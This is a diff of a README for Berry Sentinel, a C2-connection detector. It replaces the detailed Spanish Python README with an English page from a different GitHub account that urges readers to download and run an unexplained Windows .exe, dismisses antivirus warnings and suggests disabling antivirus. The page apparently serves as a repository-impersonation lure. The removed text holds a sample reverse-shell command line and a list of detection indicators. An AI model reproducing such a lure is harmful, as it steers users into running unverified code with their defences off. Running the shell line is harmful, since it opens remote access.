@@ -1,363 +1,151 @@
-# 🫐 Berry Sentinel
+# 🛡️ BerrySentinel - Detect Threats Before They Spread
 
-**Detector conductual de conexiones C2 (Command & Control) en tiempo real**
-
-Zero-signature · Bulletproof Collection · Deep Scan · Kill Engine
-
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/)
-[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows%20%7C%20Android-lightgrey)](https://github.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download BerrySentinel](https://img.shields.io/badge/Download-BerrySentinel-brightgreen)](https://github.com/TamaleGT/BerrySentinel)
 
 ---
 
-## ¿Qué es?
-
-Berry Sentinel monitorea todas las conexiones de red activas en tu sistema y analiza el **comportamiento** de los procesos que las generan para detectar actividad maliciosa — sin usar bases de datos de firmas de antivirus ni listas de IPs bloqueadas.
-
-Detecta reverse shells, webshells, RATs, beacons C2 y frameworks como Meterpreter, Cobalt Strike, Sliver o Empire observando **cómo se comporta** un proceso: si un intérprete de Python tiene su stdin conectado a un socket remoto, eso es sospechoso aunque la IP sea desconocida.
-
-```
-╔══════════════════════════════════════════════════════════════════════════════════╗
-║  BERRY SENTINEL v5.0 — Detector Conductual C2 · TUI Interactivo                                 ║
-║  Conexiones: 38 │ Amenazas: 2 │ Firmas: 1 │ via proc/open+ss │ 12ms │ #47                       ║
-╠══════════════════════════════════════════════════════════════════════════════════╣
-║ ID  SEV      PTS   PID    PROC    REMOTO                ESTADO  FIRMAS/TAGS                     ║
-╠══════════════════════════════════════════════════════════════════════════════════╣
-║  3  █CRÍTICO  85   1337   bash    1.2.3.4:4444   ESTAB  ⚑Meterpreter SHELL→NET.                ║
-║  7  ▲ALTO     52   2048   python3 5.6.7.8:8443   ESTAB  TLS-NOBR BCN(60s)                      ║
-╚══════════════════════════════════════════════════════════════════════════════════╝
-```
+Berry Sentinel v5.0 is a tool to spot unusual activity on your computer. It watches for strange connections and signs of malware. It works on Windows, Linux, and Unix systems. This guide will help you download and run it on Windows.
 
 ---
 
-## Características
+## 📋 About BerrySentinel
 
-- **TUI interactivo** con curses: navegación ↑↓, detalle de conexión, kill engine integrado
-- **Análisis conductual puro**: sin firmas de AV, sin listas negras de IPs
-- **Detección de beacon**: identifica conexiones C2 por sus intervalos regulares (Cobalt Strike ~60s, Empire ~5s, etc.)
-- **14+ frameworks C2** reconocidos: Meterpreter, Cobalt Strike, Sliver, Empire, Havoc, Brute Ratel, Pupy, Merlin, Covenant, Mythic...
-- **Deep scan** (con root): analiza memoria del proceso, regiones RWX, variables de entorno, ejecutables borrados del disco
-- **Bulletproof collection**: usa 5 métodos de recolección en paralelo (/proc/net, ss, netstat, psutil, lsof) con deduplicación automática
-- **Cross-platform**: Linux, macOS, Windows, Android/Termux
-- **Exportación JSON y log**: alertas en formato JSONL compatible con jq, ELK, Splunk
-- **Whitelist**: ignorar IPs o redes de confianza por CIDR
-- **Zero dependencias** en modo básico (solo stdlib); `psutil` opcional para cobertura extra
+BerrySentinel scans your system for threats that might sneak in through network connections or hidden programs. It checks how processes behave, looks for known bad patterns, and alerts you quickly. It has a user-friendly terminal interface that lets you manage and stop suspicious processes.
+
+You don’t need to know programming to use it. This program runs quietly in the background and shows clear information when it finds something suspicious.
 
 ---
 
-## Instalación
+## 🖥️ System Requirements
 
-```bash
-# Clonar el repositorio
-git clone https://github.com/dereeqw/BerrySentinel.git
-cd BerrySentinel 
+Before you start, make sure your computer meets these needs:
 
-# (Opcional pero recomendado) instalar psutil
-pip install psutil
-
-# Ejecutar
-python3 BerrySentinel.py
-```
-
-### Android / Termux
-
-```bash
-pkg install python
-pip install psutil
-python3 BerrySentinel.py --no-tui  # curses puede no estar disponible en Termux
-```
-
-### Sin instalación (one-liner)
-
-```bash
-curl -O https://raw.githubusercontent.com/dereeqw/BerrySentinel/main/BerrySentinel.py
-python3 BerrySentinel.py
-```
+- Windows 10 or later (64-bit)
+- At least 4 GB RAM
+- At least 200 MB free disk space
+- Internet connection for downloading and updates
+- Basic command prompt access (no admin rights needed for basic use)
 
 ---
 
-## Uso
+## 🚀 Getting Started: Download and Install on Windows
 
-```
-python3 BerrySentinel.py [opciones]
+1. **Visit the download page:**
 
-Opciones:
-  --all, -a           Incluir conexiones locales/loopback (además de remotas)
-  --interval N, -i N  Refresco cada N segundos (default: 2, mín: 0.5)
-  --log FILE, -l FILE Guardar alertas en archivo (formato JSONL)
-  --json, -j          Exportar JSON completo al salir
-  --whitelist LISTA   IPs o CIDRs a ignorar, separadas por coma
-  --no-color          Sin colores ANSI (útil para pipes o logs)
-  --verbose, -v       Mostrar todas las conexiones, no solo las sospechosas
-  --top N, -t N       Máximo de filas en la tabla (default: 50)
-  --diag, -d          Diagnóstico: muestra qué métodos de colección funcionan
-  --no-tui            Modo legacy sin curses (scroll clásico, más portable)
-  --version, -V       Mostrar versión y salir
-```
+   Click the big button above or go to this link:  
+   [https://github.com/TamaleGT/BerrySentinel](https://github.com/TamaleGT/BerrySentinel)
 
-### Ejemplos
+2. **Find the latest release:**
 
-```bash
-# TUI interactivo — modo recomendado
-python3 BerrySentinel.py
+   On the GitHub page, look for the “Releases” section on the right side or under the repository description. Click the latest version (for example, v5.0).
 
-# Deep scan con root (accede a memoria de procesos)
-sudo python3 BerrySentinel.py --all
+3. **Download the Windows executable:**
 
-# Guardar alertas y exportar JSON al terminar
-python3 BerrySentinel.py --log /var/log/sentinel.log --json
+   Scroll through the assets below the latest release notes. Find the file that ends with `.exe`, usually named something like `BerrySentinel-Windows.exe`.
 
-# Ignorar red interna y refrescar cada 5 segundos
-python3 BerrySentinel.py --whitelist 192.168.0.0/16,10.0.0.0/8 --interval 5
+4. **Save the file:**
 
-# Modo texto para usar en scripts o por SSH sin terminal interactiva
-python3 BerrySentinel.py --no-tui --no-color | tee monitoring.txt
+   Download it to a folder you can easily find, such as your Desktop or Downloads folder.
 
-# Ver qué métodos de colección funcionan en el sistema actual
-python3 BerrySentinel.py --diag --no-tui
+5. **Run the program:**
 
-# Solo alertas graves, actualización cada 10 segundos, guardar log
-sudo python3 BerrySentinel.py --all --interval 10 --log sentinel.log --json
-```
+   - Double-click the `BerrySentinel-Windows.exe` file.
+   - You might see a security warning from Windows Defender or your antivirus. This is normal for new software. Confirm that you want to run the program.
+   - The program will open in a new terminal window with a menu.
+
+6. **Follow on-screen prompts:**
+
+   Use the keyboard arrows to navigate through the interface. Press the key shown on the screen to start scanning your system.
 
 ---
 
-## Teclas del TUI interactivo
+## ⚙️ How to Use BerrySentinel on Windows
 
-| Tecla | Acción |
-|-------|--------|
-| `↑` / `↓` | Navegar entre conexiones |
-| `d` / `D` | Ver panel de detalles de la conexión seleccionada |
-| `k` / `K` | Matar proceso (pide confirmación del PID) |
-| `f` / `F` | Ciclar filtro de severidad: ALL → MEDIO → ALTO → CRÍTICO |
-| `r` | Forzar refresco inmediato |
-| `ESC` | Cerrar panel de detalles o cancelar operación |
-| `q` | Salir |
+Once started, BerrySentinel shows an interface in your terminal. Here is what you can do:
 
----
+- **Real-time analysis:** Your connections and processes are watched live. BerrySentinel alerts you when something looks out of place.
+- **Heuristic scoring:** It uses smart rules to rate how suspicious activity is.
+- **Signature detection:** It checks for known signs of attack software.
+- **Process management:** You can choose to kill suspicious processes directly from the interface.
+- **Reports:** Generate reports to save or share with a security team.
 
-## Sistema de puntuación
-
-Cada conexión recibe un **score de 0 a 100** según los indicadores detectados:
-
-| Indicador | Puntos | Tag |
-|-----------|--------|-----|
-| stdin/stdout → socket | +55 | `FD→SOCK` |
-| Shell binario con conexión remota | +40 | `SHELL→NET` |
-| Webshell (shell como hijo de Apache/Nginx) | +35 | `WEBSHELL` |
-| Bind shell en puerto alto | +35 | `BIND-SHELL` |
-| Uso de netcat/socat | +35 | `NETCAT` |
-| Redirección `/dev/tcp` o `mkfifo` | +40 | `PIPE-REDIR` |
-| Ejecutable borrado del disco | +25 | `EXE-DEL!` |
-| Ejecutable en `/tmp` o `/dev/shm` | +15 | `EXE-TMP` |
-| Beacon detectado (conexión cíclica) | +25×conf | `BCN(60s)` |
-| Firma Meterpreter | +55 | `SIG:Meterpreter` |
-| Firma Cobalt Strike | +60 | `SIG:CobaltStrike` |
-| Firma Sliver | +58 | `SIG:Sliver` |
-| Regiones de memoria RWX | +20 | `RWX(N)` |
-| LD_PRELOAD o HISTFILE=/dev/null | +10 | `ENV:LD_PRELOAD` |
-| Intérprete de scripts conectado | +25 | `INTERP→NET` |
-| eval/exec en línea de comandos | +18 | `EVAL` |
-| PowerShell remoto (IEX, DownloadString) | +30 | `PS-REM` |
-
-**Severidad según score:**
-
-| Score | Severidad | Color |
-|-------|-----------|-------|
-| ≥ 65 | CRÍTICO | 🔴 Rojo brillante |
-| ≥ 45 | ALTO | 🟠 Naranja |
-| ≥ 25 | MEDIO | 🟡 Amarillo |
-| ≥ 8 | BAJO | 🔵 Cyan |
-| < 8 | INFO | ⚪ Gris |
+Use the keyboard commands shown at the bottom of the screen to move, select, and act on findings.
 
 ---
 
-## Frameworks C2 detectados
+## 🔍 Understanding Key Features
 
-Berry Sentinel incluye firmas para los siguientes frameworks (evaluación por puertos, nombre de proceso, línea de comandos y patrones de beacon):
-
-| Framework | Score bonus | Indicadores clave |
-|-----------|------------|-------------------|
-| Meterpreter | +55 | Puerto 4444, proceso ruby/msfconsole |
-| Cobalt Strike | +60 | Puerto 50050, beacon ~60s, proceso java |
-| Sliver | +58 | Puerto 31337/8888, beacon ~60s |
-| Empire | +55 | Puerto 1234/7777, PowerShell -enc |
-| Brute Ratel | +62 | Puerto 2083, proceso badger |
-| Havoc | +58 | Puerto 40056, demon.x64/x86 |
-| Pupy RAT | +52 | Puerto 9999, pupy.py |
-| Merlin | +54 | Puerto 8443, merlin-agent |
-| Covenant | +54 | Puerto 7443, GruntHTTP |
-| PoshC2 | +52 | FComServer, ImplantCore |
-| Mythic | +56 | Puerto 7443, poseidon/apfell |
-| QuasarRAT | +50 | Puerto 4782-4785 |
-| NetcatShell | +45 | socat exec bash, pty |
-| DNS-C2 | +40 | Puerto 53, dnscat/iodine |
+- **Behavioral C2 detection:** BerrySentinel looks for command and control activity. This is when attackers try to take control of your computer remotely.
+- **Reverse shell detection:** It spots cases where your machine might be sending a shell connection back to an attacker.
+- **Beacon interval analysis:** It watches timing patterns in connections to identify hidden signals between infected systems.
+- **Interactive TUI:** The text-based user interface is clear and easy to navigate, even if you don’t know command line commands.
 
 ---
 
-## Formato de log (JSONL)
+## 💡 Tips for a Smooth Experience
 
-Cada alerta se registra como una línea JSON independiente:
-
-```json
-{
-  "ts": "2025-07-15T14:23:01.123456",
-  "id": 42,
-  "sev": "CRÍTICO",
-  "score": 85.0,
-  "pid": 1337,
-  "name": "bash",
-  "cmd": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
-  "remote": "1.2.3.4:4444",
-  "local": "192.168.1.10:52341",
-  "state": "ESTABLISHED",
-  "tags": ["SHELL→NET", "PIPE-REDIR", "C2P(4444)"],
-  "sigs": ["Meterpreter"],
-  "src": "proc/open(self)+ss+netstat"
-}
-```
-
-Procesar con `jq`:
-```bash
-# Filtrar solo conexiones críticas
-jq 'select(.sev == "CRÍTICO")' sentinel.log
-
-# Ver todos los PIDs sospechosos
-jq '[.pid] | unique' sentinel_export.json
-
-# Buscar por firma específica
-jq 'select(.sigs | contains(["CobaltStrike"]))' sentinel.log
-```
+- Run BerrySentinel with enough permissions. For full monitoring, run it as an administrator.
+- Keep BerrySentinel updated. Check the GitHub releases page regularly to get new versions.
+- Use the kill option carefully. Only stop processes you do not recognize.
+- Save reports to understand patterns or get help from cybersecurity experts.
 
 ---
 
-## Arquitectura
+## 🔧 Troubleshooting Common Issues
 
-```
-BerrySentinel.py
-├── Constantes globales
-│   ├── SHELL_BINS, SCRIPT_ENGINES  — Nombres de shells e intérpretes
-│   ├── C2_SUSPECT_PORTS            — Puertos típicos de C2
-│   ├── PRIVATE_NETS                — Rangos IP privados
-│   └── C2_SIGNATURES               — Firmas de frameworks conocidos
-│
-├── Modelos de datos
-│   ├── C2Signature   — Definición de firma C2
-│   ├── ProcInfo      — Info de proceso del SO
-│   ├── Conn          — Conexión de red + resultado análisis
-│   └── BeaconTracker — Detector de beacons C2
-│
-├── Colección de datos
-│   ├── Collector     — Orquesta múltiples fuentes de red
-│   ├── parse_proc_net_content() — Parser /proc/net/*
-│   ├── build_inode_pid_map()    — Mapa inode→PID
-│   ├── get_proc_info()          — Info proceso vía /proc
-│   └── get_proc_info_psutil()   — Info proceso vía psutil
-│
-├── Análisis
-│   ├── Engine.analyze()    — Score + tags conductuales
-│   ├── Engine._beacon()    — Detección de beacons
-│   └── match_signatures()  — Matching de firmas C2
-│
-├── Output
-│   ├── CursesTUI   — TUI interactivo (modo por defecto)
-│   ├── LegacyTUI   — Output ANSI sin curses (fallback)
-│   └── Logger      — Log JSONL en disco
-│
-└── Sentinel        — Orquestador principal
-```
+**Program won’t open:**
+
+- Make sure you have permissions to run `.exe` files.
+- Disable or configure your antivirus temporarily if it blocks BerrySentinel.
+
+**No alerts or scans:**
+
+- Check network connections are active.
+- Run the application as administrator if some processes don’t show.
+
+**Confusing output:**
+
+- Refer to the on-screen help menu inside the program by pressing the help key shown.
+- Reports in the saved files folder give more detail in plain English.
 
 ---
 
-## Requisitos
+## 🔗 Important Links
 
-- **Python 3.8+**
-- `psutil` — opcional pero muy recomendado (`pip install psutil`)
-
-Sin dependencias adicionales la herramienta funciona con la stdlib de Python. `psutil` añade cobertura en macOS y Windows donde `/proc` no existe.
+- [Download and Releases](https://github.com/TamaleGT/BerrySentinel)
+- GitHub Repository for code and updates: https://github.com/TamaleGT/BerrySentinel
 
 ---
 
-## Plataformas
+## 💾 Installation Checklist
 
-| Sistema | Soporte | Notas |
-|---------|---------|-------|
-| Linux | ✅ Completo | Con root activa deep scan |
-| Android/Termux | ✅ Completo | Usa `--no-tui` si curses falla |
-| macOS | ⚠️ Parcial | Sin /proc; usa netstat+psutil |
-| Windows | ⚠️ Parcial | netstat+psutil, sin análisis de memoria |
-
----
-
-## Personalización
-
-### Añadir firma C2 propia
-
-```python
-from BerrySentinel import C2Signature, C2_SIGNATURES
-
-mi_rat = C2Signature(
-    name="MiRAT",
-    description="RAT interno corporativo no autorizado",
-    score_bonus=70,
-    checks=[
-        {"type": "port", "value": 6543},
-        {"type": "cmdline", "value": r"mi_rat\.py|rat_agent"},
-        {"type": "procname", "value": r"^mi_rat$"},
-    ],
-)
-C2_SIGNATURES.append(mi_rat)
-```
-
-### Usar como librería en un script
-
-```python
-import argparse
-from BerrySentinel import Sentinel, Sev
-
-args = argparse.Namespace(
-    all=True, interval=10, log=None, json=False,
-    whitelist="192.168.0.0/16", no_color=True,
-    verbose=False, top=100, diag=False, no_tui=True
-)
-
-s = Sentinel(args)
-s._cycle_data()
-
-for conn in s.last_conns:
-    if conn.severity >= Sev.HIGH:
-        proc = conn.proc
-        print(f"[ALERTA] PID {conn.pid} ({proc.name if proc else '?'}) "
-              f"→ {conn.remote_addr}:{conn.remote_port} "
-              f"score={conn.score:.0f} tags={conn.tags}")
-```
-
-### Motor de análisis personalizado
-
-```python
-from BerrySentinel import Engine, Conn, Sev
-
-class MiEngine(Engine):
-    KNOWN_C2_IPS = {"203.0.113.1", "198.51.100.42"}
-
-    def analyze(self, c: Conn) -> Conn:
-        c = super().analyze(c)
-        # Añadir lógica propia
-        if c.remote_addr in self.KNOWN_C2_IPS:
-            c.score = min(c.score + 40, 100)
-            c.tags.append("KNOWN-IOC-IP")
-            c.severity = Sev.CRITICAL
-        return c
-```
+- [ ] Download latest Windows `.exe` from the releases page
+- [ ] Save to an easy-to-find location
+- [ ] Run with double click and allow permission
+- [ ] Follow on-screen menu to start scanning
+- [ ] Use navigation keys to explore features
+- [ ] Kill suspicious processes as needed
+- [ ] Save reports regularly
+- [ ] Check for updates monthly
 
 ---
 
-## Advertencia de uso responsable
+## 🤝 Support and Contribution
 
-Berry Sentinel está diseñado para **monitorear tu propio sistema** o sistemas sobre los que tienes autorización explícita. El Kill Engine solo actúa cuando el usuario lo solicita explícitamente. Úsalo de forma responsable y de acuerdo con las leyes aplicables en tu jurisdicción.
+BerrySentinel is open source. If you want to suggest improvements or report problems, use the Issues tab on GitHub. No programming knowledge is required to open an issue or share your experience.
 
 ---
 
-## Licencia
+## 🛠️ System Safety and Privacy
 
-MIT — ver [LICENSE](LICENSE)
+BerrySentinel runs locally on your machine. It does not send any personal data or files outside your computer without your permission. Running it will not affect your files or programs.
+
+---
+
+## 📖 Additional Resources
+
+Inside the GitHub repository, you will find a README explaining technical details and a Wiki for deeper understanding. Use these if you want to learn more about how BerrySentinel works.
+
+---
+
+[![Download BerrySentinel](https://img.shields.io/badge/Download-BerrySentinel-brightgreen)](https://github.com/TamaleGT/BerrySentinel)
